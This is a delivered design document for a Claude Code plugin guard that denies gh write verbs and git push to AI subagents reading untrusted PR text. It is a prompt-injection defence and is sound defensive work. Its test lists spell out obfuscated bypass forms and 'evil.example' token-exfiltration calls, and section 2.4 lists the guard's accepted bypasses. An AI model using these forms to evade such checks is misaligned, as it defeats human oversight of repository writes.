# PRD-027 · GitHub write guard, opencode recipe, and delegate self-match

| Field | Value |
|---|---|
| Status | delivered on 2026-10-22 |
| Owner | Daniel Malka |
| Created / updated | 2026-10-21 / 2026-10-22 (amended 2026-10-21 after security review round 1; amended again 2026-10-21 after security review round 2; amended a third time 2026-10-21 after security review round 3; amended a fourth time 2026-10-21: the parser is replaced by a short rule (owner decision); amended a fifth time 2026-10-21 after security review round 4; amended a sixth time 2026-10-22 after security review round 5, owner choice "a": one last short round; amended a seventh time 2026-10-22 after security review round 6, owner choice "a": one extra round; amended an eighth time 2026-10-22 after security review round 7, owner choice "a": the backslash-newline form is an accepted bypass) |
| Tickets | T-2701, T-2702, T-2703, T-2704 (planned) |
| Origin | Security review of PRD-026 (residual S3), owner chat 2026-10-21 (discovery DISC-007); measurement M2 of the opencode recipe, 2026-10-21 |
| Depends on | PRD-026 (delivered, 0.32.0) |
| Enables | nothing |

## 1. Problem

Three defects ride in one batch (0.32.1).

**G1 · Prose is the only barrier against a `gh` write (S3 residual of PRD-026).** In `/dh:review pr <n>`, a dispatched `qa-verifier` reads third-party PR text (title, body, comments) and has the Bash tool and the `gh` credential. The rule "no `gh` write verb" exists only as prose in `.commands/review.md`. Fact: the session runs in bypass permission mode, so no permission prompt stands between an injected `gh pr merge` and the repository. Fact: `adapters/claude-code/plugin/hooks/panel.ts` already runs a Bash guard (`guardBash`, `tool.call` path) for commits and AI mentions, but no check on `gh` write verbs or `git push`.

**G2 · The opencode recipe fails on v2.0.32.** Fact (measured 2026-10-21, M2): `opencode run` has no `--dir` and no `--variant`. The variant is part of the model string (`-m provider/model#variant`). A separate `cd` in its own Bash call does not persist, because the runtime resets the working directory. Fact: `.skills/external-clis/references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md` and `SKILL.md` still show `--dir` and `--variant`.

**G3 · Delegates kill their own shell.** Fact (seen 2026-10-21): `pgrep -f` and `pkill -f` with a pattern that contains the delegate's own command or path match the delegate's shell. Result: exit 144 and endless waits. Fact: `live-tree-freeze.md`, `clone-isolation.md` and `agy.md` recommend `pkill -f -- "<clone path>"` or `pkill -f -- "<prompt basename>"`.

Also: `.agents/release-manager.md` ("Stop when") says "This role performs no remote action". That sentence is not true for the flow where the owner authorizes a publish, and it hides the rule that decides who may publish.

## 2. Solution

### 2.1 The guard

In Claude Code, the plugin mod denies a shell-command call when all of these hold:

1. The call has an `agentId`, so a subagent makes it.
2. The subagent type is a kit type (prefix `dh:`) and it is not `dh:release-manager`, or the type is not in the map (fail closed).
3. The rule of 2.3 denies the command.

The check runs on the Bash tool and on every other tool that takes a shell command (`Monitor`, `PowerShell`). For each tool, the mod reads the `command` field of the call (R3). Fact: the `PowerShell` input carries the command text in `command`, a string, the same as `Bash` (Claude Code docs, hooks page). A `PowerShell` call from a kit subagent in scope is denied with the verb "unreadable command" when `command` is missing or is not a string. A `Monitor` call without `command` (a monitor that is not a shell command) is not denied.

The main session (no `agentId`) and `dh:release-manager` are not affected. A subagent that is not a kit agent is not affected (other plugins' agents in the same session must keep working). The mod builds the map `agentId` to `subagentType` from `agent.spawn`, where `panel.ts` already reads `x.subagentType` and `r.agentId`.

A shell-command call with an `agentId` that the map does not know is denied, with a reason that names the cause ("unknown subagent type"). This is the fail-closed branch. Only a denial by 2.3 triggers this guard: a call that 2.3 allows is never denied by this guard.

### 2.2 The `gh` read list

The guard allows only these `gh` reads. It denies every other `gh` command, so a new write verb is denied without a list change.

| Command | Allowed |
|---|---|
| `gh` with no subcommand, `gh --version`, `gh status` | yes |
| `gh pr` | `view`, `diff`, `list`, `status`, `checks` |
| `gh issue` | `view`, `list`, `status` |
| `gh repo` | `view`, `list` |
| `gh run` | `view`, `list`, `watch` |
| `gh release` | `view`, `list` |
| `gh workflow` | `view`, `list` |
| `gh search <kind>` | yes |
| `gh auth status` | yes, with only `-h` or `--hostname` (with a value, or `=value`) and `-a` or `--active`. Any other token that starts with `-` makes it not a read |
| `gh api <path>` | yes, when every flag is `--jq` or `-q` (with a value), `--paginate`, `-i` or `--include`, `--cache` (with a value), or `--silent`. It has no `--hostname` |

The guard checks a `gh` read from left to right, in order:

- A flag that takes a value consumes the next token (or its `=value`), whatever that token looks like.
- `-R` or `--repo <value>` is accepted only in an option position, before or after the subcommand. It is never the value of another flag.
- A value flag with no value makes the command not a read.
- For the subcommands other than `gh api` and `gh auth status`, other flags are allowed (`gh pr view 1 --json title`).
- `gh api` accepts only the flags of the table. It does not accept `-R`, `--repo` or `--hostname` (`--hostname <v>` or `--hostname=<v>`).
- A `gh api` command with any token that contains `://` is not a read. A full URL or another host can send the stored token away.

Example: `gh api repos/o/r --jq -R --method=DELETE` is denied. `--jq` consumes `-R` as its value, and `--method=DELETE` is not in the list.

A `--help` or `-h` on a write subcommand is not a read. `gh pr merge --help` is denied.

For `git` there is no read list. The guard always denies a triggered `git` command, except the plain grep of 2.3.

### 2.3 The rule

The guard applies one short rule. It has no parser: no splitting, no recursion and no length limit. The rule is the same for Bash, Monitor and PowerShell.

1. The trigger text is the command in lower case, with these changes.
   - Bash: the guard builds two trigger texts. Text A: every `\`, `'` and `"` is removed. Text B: each pair `\\` becomes `/`, then every remaining `\`, `'` and `"` is removed. The command is triggered when either text triggers (point 2).
   - Why text A: inside a legacy backtick command substitution, bash removes one backslash layer first. So ``echo `g\\it push` `` runs `git push`, and text A has the word `git`.
   - Why text B: a Windows-style path with doubled backslashes must not fuse into the name. In text B the pairs become `/`, so the word `gh` stays a word.
   - PowerShell: every `\` becomes `/`. Every `'`, `"` and backtick is removed.
   - In PowerShell, `\` is a path separator, not an escape. So `<drive>:\Program Files\GitHub CLI\gh.exe` keeps the word `gh`.
   - In PowerShell, the backtick is an ignored escape inside a name (`g`h`), so it is removed.
2. The command is triggered when the trigger text has a word `gh`, or a word `git` and also, anywhere in the trigger text, one of the write words `push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`.
3. A word starts at the beginning or after any character that is not a letter, a digit or `_`. So `=`, `.`, `-` and `:` start a word.
   - The word `git` ends at the end, before `.exe`, or before any character that is not a letter, a digit or `_`. So it ends before `-`, and `git-lfs push` and `git-push` trigger.
   - The word `gh` ends at the end, before `.exe`, or before any character that is not a letter, a digit, `_` or `-`. It does not end before `-`.
   - A write word ends at the end or before any character that is not a letter, a digit, `_` or `-`.
   - So `gh-pages` and `ghq` are not the word `gh`. `/usr/bin/gh`, `gh.exe`, `gh)`, `--upload-pack=gh` and `GIT_CONFIG_KEY_0=alias.p` are.
4. A command that is not triggered is not denied by this guard.
5. A triggered command is allowed in two cases only. Otherwise it is denied.
   - The gh read. No trigger text triggered on `git` (in Bash, neither text A nor text B). The raw command, trimmed, has only the characters `A-Z a-z 0-9`, space, `.`, `_`, `/`, `:`, `=`, `,`, `@`, `%`, `+` and `-`. It is one `gh` read from 2.2.
   - The plain grep. The first word is `grep`, `egrep` or `fgrep`. The raw command has none of `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, the backtick or a newline. Quotes and backslashes are allowed. grep cannot run another program, so its pattern can name `git push`.

PowerShell: neither allowed case applies. A triggered PowerShell command is always denied, so `gh pr view 1` in PowerShell is denied.

Every triggered command outside the two allowed cases is denied, even when it is harmless. Accepted false positives:

- A compound command that names `gh` (`cd x && gh pr view 1`). Run the read alone.
- A gh read with quotes or other special characters (`gh pr view 1 --jq '.x'`).
- A git command that names a write word (`git log --grep=push`, or a commit message that names push). Only `release-manager` commits.
- A search that is not grep and names `gh` or a git write word (`rg 'git push'`).
- A path with a `gh` part (`ls ~/.config/gh`).
- A harmless text with the word `gh` (`echo gh`, `grep -n 'gh;' README.md`, `npm run x-gh`).
- A git read that names a write word in an option (`git log --grep=push`).
- Any `gh` read in PowerShell.
- A `gh` read whose binary name is not lower case (`GH pr view 1`). The read check uses the raw command, so it is denied. This fails closed.

The deny message tells the agent to use the Grep tool for a text search. The owner can run the command in the main session.

### 2.4 Known bypasses (accepted, not fixed)

The guard is text analysis. An unexpected exception inside it lets the call through (R7). It does not stop:

- a command name built at run time (variables, `eval`, string tricks that leave no `gh` or `git` word, such as a backslash followed by a newline inside the name);
- shell aliases and functions defined earlier;
- scripts and build tools on disk (`make push`);
- other interpreters (`python -c`, `node -e`) and text piped into one;
- git aliases stored in config by an earlier call;
- `curl` with a token;
- MCP GitHub tools;
- a non-kit subagent;
- child processes of an external CLI;
- unverified hypothesis (not checked against `gh`): in the read groups other than `gh api`, a `-R HOST/OWNER/REPO` value, a `HOST/OWNER/REPO` argument or a full URL argument could make `gh` send `GH_ENTERPRISE_TOKEN` to another host. The owner's setup has no such token. Revisit if a GitHub Enterprise token is used.

The prose bans stay as the second layer. An OS sandbox is out of scope.

### 2.5 Other changes

- `release-manager` text is corrected (D8). It runs the remote actions (push, PR, merge, tag) only with explicit owner authorization, and it never receives third-party PR title, body or comments. Any dispatch rule that sends PR text to an agent names `qa-verifier`, never `release-manager`.
- The opencode recipe is corrected (D10). opencode becomes the second named exception, beside `claude`, to the rule "the call is one command that starts with the binary".
- The self-match gotcha is recorded and the three kill recipes change (D11).
- Release 0.32.1, one PR. The PR touches the critical paths of `REVIEW.md` (`adapters/claude-code/plugin/hooks/**`, `.skills/external-clis/**`), so it stops before the merge for the owner's ok.

## 3. Rules

Each rule states how to verify it. File names for new code are the author's proposal.

- R1 Pure function. A new file in `adapters/claude-code/plugin/hooks/lib/` (proposal: `gh-guard.ts`) exports a pure function. Its input is a command string. Its output is the denied command (a string such as `gh pr merge`, `gh secret set` or `git push`) or `undefined`. It reads no file and runs no process. Verifiable: the file exists, imports nothing that does I/O, and the unit tests of R2 call it directly.
- R2 Unit tests. A test file covers the cases below. Verifiable: the tests pass under the repository's TypeScript test run (the command `claude plugin test` or the hooks test script that `panel.test.ts` already uses).
  - Denied (a command is returned): `gh pr merge 1 --squash`; `gh pr merge --help`; `cd x && git push`; `GH_TOKEN=t gh pr comment 1 -b hi`; `gh api -X POST repos/o/r/issues/1/comments`; `gh api repos/o/r/issues/1/comments -f body=hi`; `gh api repos/o/r/pulls/1 -iXPUT`; `gh api repos/o/r/pulls/1 --method PUT`; `gh api -iXPOST repos/o/r/issues/1/comments`; `gh api -pfbody=hi repos/o/r/issues/1/comments`; `gh api -H "X-HTTP-Method-Override: PUT" repos/o/r/pulls/1/merge`.
  - Denied, regression set from the review rounds: `git status; gh pr merge 1`; `echo "$(true; gh pr merge 1)"`; `echo "$(git -c 'user.name=a;b' push)"`; `git -c 'user.name=a;b' push`; `echo $'it\'s'; gh pr merge 1`; `g\it push`; `\git push`; `git` and `push` split by a line continuation; `sudo -u x gh pr merge 1`; `env -u VAR gh pr merge 1`; `env -u git gh pr merge 1`; `env -u git git push`; one case for each of the wrappers `timeout`, `nohup`, `nice`, `time`, `xargs`, `stdbuf` and `setsid`; one case for each of `{`, `!`, `then`, `do` and `else` before the binary; `>/dev/null gh pr merge 1`; `<(gh pr merge 1)` and `>(gh pr merge 1)`; `gh.exe pr merge 1`; `git.exe push`; `bash -c "git push"`; `git push>out.txt`; `gh pr merge>out.txt`; `find . -exec git push \;`; `find . -execdir gh pr merge 1 {} +`; `watch -n 1 git push`; `script -qc "git push" /dev/null`; `parallel git push ::: a`; `flock /tmp/l git push`; `chronic git push`; `ssh host git push`; `git send-pack`; `git subtree push --prefix d origin main`; `git p4 submit`; `git svn dcommit`; `git -c alias.p=push p`; `git config --global alias.p push && git p`; `gh alias set x y`; `gh auth status -t`; `gh auth status --show-token`; `gh api repos/o/r --jq -R --method=DELETE`; `gh api repos/o/r --repo --method=DELETE`; `gh api repos/o/r --jq`; `gh auth status --show-token=true`; `gh auth status -t=true`; `gh auth status -at`; `git -c core.sshCommand='gh pr merge 1 #' fetch`; `git --upload-pack='gh pr merge 1 #' fetch x`; `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p`; `$(git --exec-path)/git-push`; `echo gh`; `grep -n 'gh;' README.md`; `git log --grep=push`; `npm run x-gh`; a PowerShell call with `g`, a backtick, then `h pr merge 1`; a PowerShell call `gh pr view 1` (no exception in PowerShell); `rg --pre 'git push' x .`; `ag --pager 'gh pr merge 1' x`; `echo 'a && git push'`.
  - Denied, one case for each other `gh` family: `gh issue close`, `gh release create`, `gh repo delete`, `gh auth token`, `gh workflow run`, `gh api --method DELETE`, `gh api --input x`, `gh secret set`, `gh secret delete`, `gh variable set`, `gh label create`, `gh run rerun`, `gh run cancel`, `gh run delete`, `gh workflow enable`, `gh workflow disable`, `gh gist create`, `gh pr update-branch`, `gh pr lock`, `gh cache delete`, `gh repo deploy-key add`, `gh release delete-asset`.
  - Denied, new with the short rule: `ls ~/.config/gh`; `cat ~/.config/gh/hosts.yml`; `$(echo gh) pr merge 1`; `gh pr view 1 --jq '.x'` (an accepted false positive).
  - Denied, new with amendment 6: the PowerShell call `<drive>:\Program Files\GitHub CLI\gh.exe pr merge 1`; `GH pr merge 1`; `Git push`; `git-lfs push origin main`; `gh api --hostname evil.example repos/o/r`; `gh api https://evil.example/x`; `GH pr view 1` (an accepted false positive).
  - Allowed (`undefined`): `gh pr view 1 --json title`; `gh pr diff 1`; `gh api repos/o/r/pulls/1`; `gh api repos/o/r/pulls/1 --jq .title`; `gh pr view 1 -R o/r`; `gh -R o/r pr view 1`; `gh auth status -h github.com`; `gh auth status --active`; `ghq list`; `grep -rn "git push" docs/`; `grep -rn "gh pr view" .commands`; `git log --oneline`; `git status && git diff`; `git -c 'user.name=a;b' status`; `env -u git git status`; `gh pr checks 1 --watch`; `gh run watch 123`; `git fetch origin`; `gh pr view 45 --json state,mergedAt`; `gh run list --limit 3`; `go test ./... 2>&1 | tail -n 20`; `sha256sum $(git ls-files -m)`; `git log --format='%h (%s)' -n 3`; `npm run gh-pages`; `gh auth status`; `gh --version`; `echo "$(git -c 'user.name=a;b' status)"`; `gh api -i repos/o/r/pulls/1`; one case for each other read of 2.2.
  - Denied, new with amendment 7: ``echo `g\\it push` ``; ``echo `g\\h pr merge 1` ``; `g\\it push`.
  - Allowed, regression cases of amendment 6: `gh pr view 1`; `gh api repos/o/r --jq .name`; `gh auth status -h github.com`; `git log`; `ls gh-pages`.
- R3 Wiring. The guard runs inside the existing `tool.call` path of `panel.ts`, by `guardBash` (or a function it calls). The same check runs on the `Bash` tool and on every other tool that takes a shell command (`Monitor`, `PowerShell`), on its command field, through that mod path. No new `hooks.json` entry, no `command` hook, no new module. Verifiable: `git diff main...HEAD -- adapters/claude-code/plugin/hooks/hooks.json` is empty; `panel.ts` calls the R1 function for each of these tools.
- R4 Subagent map. `panel.ts` records `agentId` to `subagentType` when `agent.spawn` returns an `agentId`, in the same place that calls `recordSpawn`. The guard reads the map by the `agentId` of the Bash call. Verifiable: an engine test spawns a subagent of type `dh:qa-verifier` and then sends a Bash call with that `agentId`.
- R5 Scope of the deny. In an engine test (the setup in `panel.engine.test.ts`): (a) a Bash call with `agentId` of type `dh:qa-verifier` and a denied command returns `deny`; (b) the same command with `agentId` of type `dh:release-manager` is not denied by the guard; (c) the same command with no `agentId` (main session) is not denied by the guard; (d) the same command with `agentId` of a type with another prefix (for example `vault-agent`) is not denied by the guard; (e) a Bash call with an `agentId` that the map does not know and a denied command returns `deny` with a reason that names the cause; (f) a kit subagent with an allowed command (`gh pr view 1`) is not denied; (g) a `Monitor` call with `agentId` of type `dh:qa-verifier` and a denied command returns `deny`, and the same `Monitor` call with no `agentId` is not denied by the guard; (h) a `PowerShell` call with `agentId` of type `dh:qa-verifier` and no string `command` returns `deny` with the verb "unreadable command", and a `Monitor` call without `command` is not denied. Verifiable: the eight tests pass. "Not denied by the guard" means the result is the same as before this PRD for that call.
- R6 Deny message. The reason (a) names the matched verb, (b) says that only `release-manager` or the main session may run it, (c) says not to retry and not to work around it, and (d) says: "For a text search, use the Grep tool." The reason for an unknown `agentId` (R5 e) also names that cause. The message is in English and uses the project's language table if `panel.ts` already holds one for other guard messages; if it does, both languages carry the four parts. Verifiable: a test asserts the four parts in the reason; no private path appears in it.
- R7 Fail-open on guard error, fail-closed on unknown type. An exception inside the guard function does not deny the call (the existing `.catch(() => undefined)` in the Bash path stays). An unknown `agentId` with a command that 2.3 denies is denied (R5 e). Verifiable: one test throws inside the guard and the call passes; R5 e passes.
- R8 Measurement M1 (owner-authorized, run by `qa-verifier` in QA after the build). One real session `claude -p --plugin-dir <built plugin dir>` in bypass permission mode. Inside it, a `dh:qa-verifier` subagent runs `gh pr merge --help`, and a `dh:release-manager` subagent runs `gh pr merge --help`. Pass: the first call is denied by the mod with the R6 message; the second prints the help text. The evidence is the session output, saved under `.harness/tasks/<id>/evidence/`. This proves that a subagent's Bash call reaches the mod with its `agentId` and that the deny holds in bypass mode. If M1 fails, this PRD ships the guard only after the owner decides; the other rules (R9 to R14) are not blocked by M1. Verifiable: the evidence file holds both outputs; the QA matrix lists M1 as pass, fail or not-run.
- R9 ADR amendment. `docs/adr/ADR-005-trava-de-runtime-por-mod.md` has an amendment dated 2026-10-21. It states: (a) a narrow exception to the sentence "travar `Bash` por análise de comando" in section 2, limited to the commands that the rule of 2.3 denies (`gh` outside the read list of 2.2, and `git` with a write word), in the Bash, Monitor and PowerShell calls of kit subagents; (b) the accepted bypasses of 2.4; (c) the PRD number. The header field "Alterado por" lists PRD-027. ADR text stays in pt-br like the rest of that file. Verifiable: `grep -n 'PRD-027' docs/adr/ADR-005-trava-de-runtime-por-mod.md` finds the header and the amendment; the amendment names all bypasses of 2.4.
- R10 Release manager text. `.agents/release-manager.md`, in "Stop when" (the sentence "This role performs no remote action"), says: the role runs the remote actions (push, PR, merge, tag) only with explicit owner authorization, and it never receives the title, the body or the comments of a third-party PR. The proof case of that file stays consistent. A dispatch rule in `.commands/*.md`, `.agents/coordinator.md` or `.skills/*/SKILL.md` that sends PR text to an agent names `qa-verifier`; none names `release-manager`. Verifiable: `grep -n 'performs no remote action' .agents/release-manager.md` finds nothing; the new text is present; `grep -rn -i 'release-manager' .commands .agents/coordinator.md` shows no dispatch of PR text to it.
- R11 opencode recipe. These files show the measured form: `cd <clone> && <opencode binary> run --auto -m <provider/model>[#<variant>] --file=<prompt file> -- "Follow the attached prompt."`. The files are `.skills/external-clis/references/opencode.md` (both recipes, the flag table: `--dir` and `--variant` removed, the `#variant` rule added), `references/clone-isolation.md` (section 3, near line 138), `references/live-tree-freeze.md` (Order step 4, near line 44), and `SKILL.md` (the binary table row near line 241 and the "Who runs the call" paragraph near line 39). Each file states that this form starts with `cd`, does not match a `Bash(opencode:*)` allow rule, and may need the owner's approval for the Bash call. Verifiable: `grep -rn -e '--dir' -e '--variant' .skills/external-clis` finds no `opencode` hit; the measured form appears in `opencode.md`.
- R12 Second named exception. The rule "every call is one command that starts with the binary" (`SKILL.md`, "Who runs the call", and the matching text in `references/clone-isolation.md` and `references/live-tree-freeze.md`) names two exceptions: `claude` and `opencode`. Both use `cd "$CLONE" && <binary> ...`. `grok` and `mcode` keep their own working-directory flag. Verifiable: `grep -n 'only allowed' .skills/external-clis/SKILL.md .skills/external-clis/references/*.md` finds no sentence that names only `claude`. PRD-025 R18 is history and stays unchanged.
- R13 Self-match gotcha. `.skills/external-clis/references/gotchas.md` has a new entry: `pgrep -f` or `pkill -f` with a pattern that contains the delegate's own command or path matches the delegate's shell (exit 144, endless waits, seen 2026-10-21); do this instead: kill by the pid recorded when the call started, or use a bracket pattern (for example `'[o]pencode run'`). The entry holds no machine path and no project name (the file's own rule). Verifiable: the entry exists with both parts.
- R14 Kill recipes. `references/live-tree-freeze.md` (near line 52), `references/clone-isolation.md` (near line 256) and `references/agy.md` (near line 27) no longer use `pkill -f -- "<clone path>"` or `pkill -f -- "<prompt basename>"`. Each kills by the recorded pid, or by a bracket pattern. The text says where the pid comes from (the call runs in the background and the Bash tool returns its pid; or the delegate reads it with `pgrep` before the call and after it, and kills the new one). Verifiable: `grep -rn 'pkill -f' .skills/external-clis` finds only the bracket-pattern form or the gotcha entry that warns against the plain form.
- R15 Cleanup. Every stale reference that this change creates is removed (AGENTS.md, "Premissa de limpeza"): sentences that say "no remote action" for `release-manager`; sentences that say "prose only" for the `gh` ban (`.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`, `docs/tutorial.html`, `docs/en/tutorial.html`) now say that the mod denies it in Claude Code and the prose stays as the second layer; sentences in the tutorials about the mod guard that list only the memory files and `Agent`. The ticket author runs each grep and lists the hits and the action taken. Verifiable: the ticket report lists the greps and the hits.
- R16 Counts. The counts stay at 13 agents and 19 commands + 1 mod command, and 14 templates. No new agent, skill, command or template. Verifiable: `go run ./cmd/dh validate .` passes; `git diff --name-status main...HEAD -- .agents .skills .commands templates` lists no added or deleted file.
- R17 Release and generated files. Release 0.32.1 in three places: `defaultVersion` in `internal/build/build.go` (now `0.32.0`), `version` in `.claude-plugin/marketplace.json`, and the source `ref` (`v0.32.1`). `CHANGELOG.md` has the 0.32.1 entry. `docs/roadmap.html` and `docs/en/roadmap.html` have a Delivered card for 0.32.1, and `dh validate` finds no drift against `CHANGELOG.md`. The tutorials (`docs/tutorial.html`, `docs/en/tutorial.html`) describe the `gh` guard where they describe the mod guard. `dist/` is regenerated by `go run ./cmd/dh build`, never by hand; a second build changes nothing except `generated_at`. `go run ./cmd/dh validate .` passes, `go test ./...` is green, and `claude plugin test` has 0 fail. Clean-clone proof applies (AGENTS.md, "Prova de clone limpo"), because the PR touches `internal/build/build.go` and `dist/*/bin`: `git clone . <tmp>`, `go run ./cmd/dh build` there, and `sha256sum` of the 5 binaries equals the tree. Verifiable: run the commands and compare with `git diff`.
- R18 Merge stop. The PR touches `adapters/claude-code/plugin/hooks/**` and `.skills/external-clis/**`, both critical paths in `REVIEW.md`. The flow stops before the merge and asks the owner for an ok, even with a green gate and an approved QA verdict (PRD-026 R12). Verifiable: the QA report lists the matched critical paths.
- R19 No private path in the PRD, the tickets or any new text. Use `<harness dir>` and `<home>`. Verifiable: `go run ./cmd/dh validate .` (`checkPrivatePaths`) passes.

## 4. Docs

Update:

- `adapters/claude-code/plugin/hooks/lib/` (new file, R1), its test file (R2), `adapters/claude-code/plugin/hooks/panel.ts` (R3, R4, R6, R7), `adapters/claude-code/plugin/hooks/panel.engine.test.ts` (R5, R6, R7).
- `docs/adr/ADR-005-trava-de-runtime-por-mod.md` (R9).
- `.agents/release-manager.md` (R10); any dispatch text found by the R10 grep.
- `.skills/external-clis/SKILL.md`, `references/opencode.md`, `references/clone-isolation.md`, `references/live-tree-freeze.md`, `references/agy.md`, `references/gotchas.md` (R11 to R14).
- `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md`: only where the "prose only" wording of the `gh` ban needs the mod note (R15).
- `docs/tutorial.html`, `docs/en/tutorial.html` (R15, R17), `docs/roadmap.html`, `docs/en/roadmap.html`, `CHANGELOG.md` (R17).
- `internal/build/build.go` (version), `.claude-plugin/marketplace.json` (R17).
- `AGENTS.md` already holds the line "Trava de `gh`" (added by the Coordinator on 2026-10-21). The ticket author reads it and reports any disagreement; it does not edit it.

No `pdocs` exist for this project.

Not affected (the ticket author checks with `grep`): `docs/plano-produto.html`; `docs/prd/PRD-025-coordinator-orchestrates.md` (R18 there is history); `README.md` and `README.en.md` unless a sentence becomes false.

## 5. Out of scope

- An OS sandbox.
- Blocking `curl` or MCP GitHub tools.
- Restricting the `qa-verifier` tool list.
- A `dh review run` subcommand.
- New eval cases or probes beyond M1 and M2.
- Changes to the `reviewers:` configuration.
- A guard in a runtime other than Claude Code (there the prose stays).
- A fix for the known bypasses of 2.4.

## 6. Owner decisions

All taken on 2026-10-21.

- D1 Scope: the mod denies the commands of 2.2 in shell-command calls (Bash, `Monitor`, `PowerShell`; R3) of kit subagents (`dh:` prefix) except `dh:release-manager`. An `agentId` whose type is not in the map is denied (fail closed), with a reason that names the cause. The main session and non-kit subagents are not affected (R4, R5, R7).
- D2 Deny rule: for kit subagents in scope (D1), a command is triggered when it has a word `gh`, or a word `git` with a write word (`push`, `send-pack`, `subtree`, `p4`, `svn`, `dcommit`, `alias`). A `git-<name>` binary counts as the word `git`. A triggered command is denied, except a `gh` read from the list of 2.2 and a plain grep. Neither exception applies in PowerShell (2.3; R1, R2).
- D3 Matching: a short rule, not a parser. In Bash the guard builds two trigger texts from the command in lower case, and either one triggers (2.3 point 1): text A without quotes and backslashes, text B with each `\\` pair mapped to `/` and then without quotes and the remaining backslashes. In PowerShell there is one text: `\` becomes `/` and quotes and backticks are removed. A "word" starts at the start or after any character that is not a letter, a digit or `_`. The word `git` ends before `.exe` or before a character that is not a letter, a digit or `_`, so it ends before `-`. The word `gh` and a write word also keep `-` inside the word. In PowerShell no exception applies. A `gh` read is allowed only when the raw command uses a small safe character set. A plain grep (first word `grep`, `egrep` or `fgrep`, no `;`, `|`, `&`, `$`, `(`, `)`, `<`, `>`, backtick or newline) is allowed. There is no splitting, no recursion and no length limit. The false positives of 2.3 are accepted (R1, R2).
- D4 Deny message: matched verb, who may run it, no retry and no workaround (R6).
- D5 Known bypasses: stated here and in the ADR amendment, not fixed (R9; section 2.4).
- D6 Pure function in `hooks/lib/`, unit tests for every example of R2, wired into the existing `tool.call` path by `guardBash` for `Bash`, `Monitor` and `PowerShell`, no hook command (R1, R2, R3).
- D7 ADR-005 section 2 amendment, narrow exception, dated 2026-10-21, with D5 (R9).
- D8 `release-manager` text corrected; PR text goes to `qa-verifier` only (R10).
- D9 Measurement M1 by `qa-verifier` in QA; if it fails, the guard ships only after the owner decides (R8).
- D10 opencode recipe per M2; opencode is the second named exception (R11, R12).
- D11 Self-match gotcha and kill by pid or bracket pattern (R13, R14).
- D12 Version 0.32.1, CHANGELOG, roadmap pt/en, tutorial, counts unchanged, clean-clone proof, stop before merge (R15 to R19).

## Appendix

### Suggested tickets

| Ticket | Lane | Executor | Write set |
|---|---|---|---|
| T-2701 | `backend` | `builder` (TypeScript) | `adapters/claude-code/plugin/hooks/lib/` (new guard file and its test), `adapters/claude-code/plugin/hooks/panel.ts`, `adapters/claude-code/plugin/hooks/panel.engine.test.ts`. Rules R1 to R7 |
| T-2702 | `backend` (kit source) | `harness-maintainer` with `harness-authoring` | `.skills/external-clis/**`, `.agents/release-manager.md`, `.commands/review.md`, `.skills/code-review/SKILL.md`, `.agents/qa-verifier.md` (only where R15 hits), `docs/adr/ADR-005-trava-de-runtime-por-mod.md`. Rules R9 to R14, part of R15 |
| T-2703 | `backend` (Go and docs) | `builder` (Go), then `docs-guide` | `internal/build/build.go`, `.claude-plugin/marketplace.json`, `CHANGELOG.md`, `docs/tutorial.html`, `docs/en/tutorial.html`, `docs/roadmap.html`, `docs/en/roadmap.html`. Rules R15 (docs part), R17 |
| T-2704 | `teste (unitário e integração)` | `qa-verifier` | Runs M1 (R8), the greps of R10 to R16, R19, the clean-clone proof (R17) and the critical-path match (R18). No production code |

Order: T-2701 and T-2702 may run in parallel (write sets are disjoint). T-2703 follows both (docs describe final text). T-2704 follows all. The release gate sequence is in R17: `dh validate`, `go test ./...`, `go run ./cmd/dh build` with no `dist/` diff, the clean-clone proof, then commit candidate; push, PR and tag only after the proof, and the merge only after the owner's ok (R18).

### Risks and pending decisions

- Risk: a legitimate kit subagent needs `git push` or a `gh` write · mitigation: only `release-manager` publishes (D1); the Coordinator dispatches it, or the main session runs the command. Fact: `grep -rn 'git push\|gh pr merge\|gh pr create' .agents .skills .commands` finds only prose that forbids or describes a residual risk, so no current flow of a non-release kit agent needs one.
- Risk: the rule gives a false positive on a legitimate command · mitigation: the deny message points to the Grep tool, and the owner can run the command in the main session. The accepted cases are the ones listed in 2.3. The false-negative cases are the bypasses of 2.4.
- Risk: a legitimate `gh` read outside the read list is denied · mitigation: the main session runs it, or a later PRD extends the list. Hypothesis: no current kit flow needs one; the ticket author runs `grep -rn 'gh ' .agents .skills .commands` and reports each `gh` call that the allow-list denies.
- Risk: the engine may not pass `agentId` for `Monitor` and `PowerShell` calls, or `Monitor` may name its command field differently · mitigation: the R5 g engine test for `Monitor`. Fact: the `PowerShell` input carries the command text in `command`, a string, the same as `Bash` (Claude Code docs, hooks page, `PowerShell` `tool_input`). The mod denies a `PowerShell` call from a kit subagent in scope when `command` is missing or is not a string (R5 h). Hypothesis: `Monitor` uses `command` too; the ticket author confirms the field name from the engine type definitions. A `Monitor` call without `command` is a non-shell monitor and is not denied.
- Risk: the engine may not pass `agentId` on a subagent's Bash call, or may not enforce `deny` in bypass mode · mitigation: M1 (R8). Fact: `hooks/runtime-guard.ts` already relies on `agentId` for `Write` and `Edit`, and `panel.engine.test.ts` already sends it. Hypothesis: the same holds for `Bash`; M1 proves it.
- Risk: the opencode form starts with `cd`, so a `Bash(opencode:*)` allow rule does not match · accepted, stated in the recipe (R11), same as `claude`.
- Assumption: the guard file name `gh-guard.ts` is the author's proposal.
- Pending decision: none blocks the tickets. The only conditional is M1 (R8).

## Executed summary

- **Delivered:** In Claude Code, the mod denies `gh` outside a short read list, and `git` with a write word, in the Bash, Monitor and PowerShell calls of kit subagents except `release-manager`, by the short text rule of 2.3. The opencode recipe uses the measured v2.0.32 form, and the `external-clis` kill recipes use a recorded pid or a bracket pattern.
- **Rules:**
  - R1 Honored: `adapters/claude-code/plugin/hooks/lib/gh-guard.ts` exports `ghWriteVerb` and `ghDenied` with no I/O; its unit tests call it directly.
  - R2 Honored: `adapters/claude-code/plugin/hooks/lib/gh-guard.test.ts`; QA round 8 ran the 192 cases of R2 with no denied case that became allowed; `claude plugin test` 250 pass, 0 fail, in the source and in `dist/`.
  - R3 Honored: the `guardBash` path of `panel.ts` checks the Bash, Monitor and PowerShell calls; `hooks.json` is unchanged (QA of T-2704).
